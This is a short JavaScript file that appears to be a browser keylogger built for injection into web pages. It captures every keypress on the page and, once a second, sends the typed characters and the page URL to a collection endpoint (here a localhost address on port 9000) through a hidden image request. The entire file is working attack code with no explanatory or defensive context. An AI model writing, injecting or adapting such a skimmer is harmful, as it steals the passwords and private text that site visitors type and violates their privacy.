var keys='';
document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	new Image().src = 'http://127.0.0.1:9000/CatchKeyLog?data='+keys+'&page='+window.location.href ;
	keys = '';
}, 1000);